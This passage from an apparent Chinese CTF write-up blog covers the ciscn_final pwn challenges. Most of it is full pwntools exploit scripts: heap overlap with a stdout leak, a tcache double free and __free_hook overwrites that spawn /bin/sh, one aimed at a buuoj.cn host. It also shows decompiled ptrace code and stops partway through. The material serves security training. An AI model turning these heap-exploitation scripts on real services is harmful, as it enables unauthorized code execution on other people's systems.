class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">offset =  <span class="number">0x3eb780</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bruteforce 4 bits</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># prepare two useful chunks</span></span><br><span class="line">        new(<span class="number">10</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line">        new(<span class="number">11</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># first chunk (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create overlap</span></span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        new(<span class="number">3</span>, <span class="number">0xF8</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        new(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">"DDDD"</span>) <span class="comment"># avoid merging to top chunk</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># free the chunk with index 16</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc from unsorted bin (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x3F8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write unsorted bin-&gt;bk ==&gt; stdout</span></span><br><span class="line">        edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x3D8</span> + p64(<span class="number">0x101</span>) + p16(<span class="number">0x5760</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc chunk at stdout</span></span><br><span class="line">        new(<span class="number">5</span>, <span class="number">0xF8</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        new(<span class="number">6</span>, <span class="number">0xF8</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.recv(<span class="number">3</span>) == <span class="string">"low"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">                p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">                <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                    gdb.attach(p, gdbscript=_source)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        p.recv(<span class="number">0x20</span> - <span class="number">3</span>)</span><br><span class="line">        libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin is broken</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x58</span>, <span class="string">"HHHH"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x48</span> + p64(<span class="number">0x61</span>) + p64(__free_hook))</span><br><span class="line">new(<span class="number">12</span>, <span class="number">0x58</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">13</span>, <span class="number">0x58</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"><span class="comment"># success(": " + hex())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="ciscn-final-6"><a href="#ciscn-final-6" class="headerlink" title="ciscn_final_6"></a>ciscn_final_6</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>有点坑，题目给的libc是2.23，搞得我直接用2.23写了fastbin attack，然后打远程发现有tcache，才发现题目上写Ubuntu 18的环境。题目本身还是很简单的。</p>
<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ol>
<li>解迷宫，拿到<code>malloc</code>的地址，从而得到libc地址。</li>
<li><code>new game</code>会创造一个新的<code>player</code>信息，先进行<code>store game</code>，然后<code>delete record</code>将当前的<code>player</code>删除，此时再依次<code>load game</code>和<code>delete record</code>，将被delete掉的<code>player</code>进行二次删除，构成tcache double free。</li>
<li><code>malloc</code>位于<code>__free_hook</code>的chunk，写为<code>system</code>，然后<code>free</code>一个”/bin/sh”的chunk，getshell。</li>
</ol>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resume</span><span class="params">(count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"what's your name?"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span><span class="params">(flag, size, comment)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'y'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"comment size?"</span>, str(size))</span><br><span class="line">        p.sendafter(<span class="string">"plz input comment"</span>, comment)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(maze, start, end, sol)</span>:</span></span><br><span class="line">    <span class="comment"># arrive at end</span></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move right if possible</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] + <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] + <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'D'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move down</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] + <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] + <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'S'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move left</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] - <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] - <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move up</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] - <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] - <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'W'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"9"</span>)</span><br><span class="line">    maze = p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span>)</span><br><span class="line">    maze += p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span> + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    maze = maze.split(<span class="string">'\n'</span>)</span><br><span class="line">    maze = [list(item[<span class="number">1</span>:<span class="number">-1</span>]) <span class="keyword">for</span> item <span class="keyword">in</span> maze][<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> maze:</span><br><span class="line">        print(<span class="string">''</span>.join(item))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># from maze[1][0] ==&gt; maze[40, 41]</span></span><br><span class="line">    sol = []</span><br><span class="line">    solve(maze, (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">40</span>, <span class="number">41</span>), sol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(sol[::<span class="number">-1</span>])</span><br><span class="line">    </span><br><span class="line">malloc_offset = libc.sym[<span class="string">"malloc"</span>]</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf1147</span></span><br><span class="line">one_gadget_offset = <span class="number">0xf02a4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get malloc address</span></span><br><span class="line">res = solve_maze()</span><br><span class="line">new(<span class="string">"0"</span>, len(res) + <span class="number">1</span>, res)</span><br><span class="line">p.recvuntil(<span class="string">"Here's the award:0x"</span>)</span><br><span class="line">libc_malloc = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_malloc - malloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line"><span class="comment"># since there is also double free in tcache bin 0x30 and 0x20</span></span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin double free</span></span><br><span class="line"><span class="comment"># new("1", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("2", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># load(1, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># store(False, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="string">"1"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"\n"</span>)</span><br><span class="line">load(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write __malloc_hook (for fastbin double free)</span></span><br><span class="line"><span class="comment"># new("3", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, p64(__malloc_hook - 0x23) + "\n")</span></span><br><span class="line"><span class="comment"># new("4", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("5", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("6", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "A" * 0x13 + p64(one_gadget) + '\n')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="string">"3"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">new(<span class="string">"5"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">new(<span class="string">"6"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __free_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="ciscn-final-7"><a href="#ciscn-final-7" class="headerlink" title="ciscn_final_7"></a>ciscn_final_7</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>强迫症驱使我把这个ciscn_final_7没做的空白填满，结果硬是断断续续地写了我两天，完了作业写不完了。<del>pwn使我失去理智。</del></p>
<h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><ol>
<li>拖到IDA一看，父进程<code>fork</code>一个子进程，通过<code>ptrace</code>对子进程进行控制，代码的主要逻辑都在子进程中。同时因为子进程被父进程<code>ptrace</code>了，所以应该是不可能直接调试子进程了。</li>
<li>学一波<code>ptrace</code>的用法，大概了解之后，看一下父进程是怎么控制子进程的: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_401582</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __WAIT_STATUS stat_loc; <span class="comment">// [rsp+18h] [rbp-2A8h]</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+20h] [rbp-2A0h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-29Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-298h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-294h]</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+30h] [rbp-290h]</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-28Ch]</span></span><br><span class="line">    __int64 v9; <span class="comment">// [rsp+38h] [rbp-288h]</span></span><br><span class="line">    <span class="keyword">char</span> v10; <span class="comment">// [rsp+40h] [rbp-280h]</span></span><br><span class="line">    __int64 v11; <span class="comment">// [rsp+C0h] [rbp-200h]</span></span><br><span class="line">    __int64 v12; <span class="comment">// [rsp+D8h] [rbp-1E8h]</span></span><br><span class="line">    __int64 v13[<span class="number">51</span>]; <span class="comment">// [rsp+120h] [rbp-1A0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+2B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(stat_loc.__iptr) = <span class="number">0</span>;</span><br><span class="line">    qword_604948 = (__int64)qword_604960;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    <span class="keyword">while</span> ( LOBYTE(stat_loc.__uptr) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v10);</span><br><span class="line">        